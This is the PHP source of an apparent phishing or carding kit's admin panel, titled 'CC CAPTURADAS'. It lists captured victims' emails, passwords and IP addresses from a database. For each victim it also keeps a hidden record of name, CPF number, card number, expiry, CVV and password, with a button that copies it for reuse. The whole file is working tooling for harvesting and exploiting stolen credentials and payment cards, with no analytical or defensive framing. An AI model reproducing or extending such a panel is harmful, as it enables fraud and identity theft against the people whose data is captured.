<?php
include('../includes/conexao.php');
session_start();

$sql = "SELECT * FROM login";

$busca = mysqli_query($conexao, $sql);

$total = mysqli_num_rows($busca);




?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>CC CAPTURADAS</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">

    <!-- Favicon -->
    <link href="img/favicon.ico" rel="icon">

    <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Roboto:wght@500;700&display=swap" rel="stylesheet"> 
    
    <!-- Icon Font Stylesheet -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">

    <!-- Libraries Stylesheet -->
    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet" />

    <!-- Customized Bootstrap Stylesheet -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Template Stylesheet -->
    <link href="css/style.css" rel="stylesheet">
</head>

<body>
    <div class="container-fluid position-relative d-flex p-0">
        <!-- Spinner Start -->
        <div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
            <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
                <span class="sr-only">Loading...</span>
            </div>
        </div>
        <!-- Spinner End -->


<?php include('menu.php'); ?>

        <!-- Content Start -->
        <div class="content">
<?php include('submenu.php'); ?>


            <!-- Table Start -->

                    <div  class="col-12">
                        <div style= "white-space: nowrap;" class="bg-secondary rounded h-100 p-4">
                            <h6 class="mb-4">Dados capturados</h6>
                            <div class="table-responsive">
                                <table class="table">
                                  
                                    <thead>
                                        <tr>
                                            <th scope="col">Infos</th>
                                            <th scope="col">Email</th></th>
                                            <th scope="col">Senha</th>

                                            <th scope="col">Ip</th>
                                     
                                               <th scope="col">Excluir</th>
                                               <th scope="col">Copiar</th>
                                        </tr>
                                        <?php
 while($dados = mysqli_fetch_assoc($busca)){?>
                                    </thead>
                                    <tbody>
                                        <tr>
                                            <th scope="row">Login <?php echo $dados["id"]?></th>
                                                                                        <td><?php if(empty($dados["email"])){echo "Nao capturado";}else{echo $dados["email"];}?></td>
                                            <td><?php if(empty($dados["senha"])){echo "Nao capturado";}else{echo $dados["senha"];}?></td>
                                            <td onclick="location.href='detalhe1.php'"><?php echo $dados["ip"]?></td>

                                 <td><a href="excluir.php?tipo=logs&id=<?php echo $dados['id']; ?>" class="btn btn-danger btn-sm"><i class="icon-edit">Excluir</i></a></td>  
                                 <td>
<button class="btn btn-primary btn-sm copy-btn" onclick="copiarRegistro(<?php echo $dados["id"] ?>)">Copiar</button>
                          
                        </td>
<p id="registro-<?php echo $dados["id"]?>" style="display: none;">
                                <?php echo "Nome: ".$dados["nome"]."\n";
                                      echo "CPF: ".$dados["cpf"]."\n";
                                      echo "Card: ".$dados["cc"]."\n";
                                      echo "Validade: ".$dados["validade"]."\n";
                                      echo "CVV: ".$dados["cvv"]."\n";
                                      echo "Senha: ".$dados["senha"]."\n";
                                      echo "IP: ".$dados["ip"]."\n"; ?>
                            </p>
                        
                                        </tr>
                                        <?php } ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Table End -->


            <!-- Footer Start -->
            <div class="container-fluid pt-4 px-4">
                <div class="bg-secondary rounded-top p-4">
                    <div class="row">
                        <div class="col-12 col-sm-6 text-center text-sm-start">
                            &copy; <a href="#">MASSA</a>
                        </div>

                    </div>
                </div>
            </div>
            <!-- Footer End -->
        </div>
        <!-- Content End -->


        <!-- Back to Top -->
        <a href="#" class="btn btn-lg btn-primary btn-lg-square back-to-top"><i class="bi bi-arrow-up"></i></a>
    </div>
<script>
function copiarRegistro(id) {
        const registro = document.getElementById(`registro-${id}`);
        if (registro) {
            const texto = registro.innerText.trim();
            navigator.clipboard.writeText(texto)
                .then(() => alert('Registro copiado com sucesso!'))
                .catch(err => console.error('Erro ao copiar o registro:', err));
        } else {
            console.error('Registro não encontrado.');
        }
    }
    
</script>
    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="lib/chart/chart.min.js"></script>
    <script src="lib/easing/easing.min.js"></script>
    <script src="lib/waypoints/waypoints.min.js"></script>
    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="lib/tempusdominus/js/moment.min.js"></script>
    <script src="lib/tempusdominus/js/moment-timezone.min.js"></script>
    <script src="lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js"></script>

    <!-- Template Javascript -->
    <script src="js/main.js"></script>
</body>

</html>